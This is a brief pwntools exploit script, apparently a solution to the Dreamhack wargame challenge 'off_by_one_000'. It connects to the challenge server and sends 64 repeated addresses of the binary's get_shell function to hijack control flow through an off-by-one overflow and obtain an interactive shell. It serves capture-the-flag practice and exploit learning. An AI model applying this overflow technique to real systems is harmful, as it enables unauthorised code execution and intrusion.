#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF("./off_by_one_000",checksec=False)

# r = process(exe.path)
r = remote('host3.dreamhack.games',23406)

get_shell = 0x080485db

payload = p32(exe.sym['get_shell'])*64

r.sendafter(b'Name: ',payload)


r.interactive()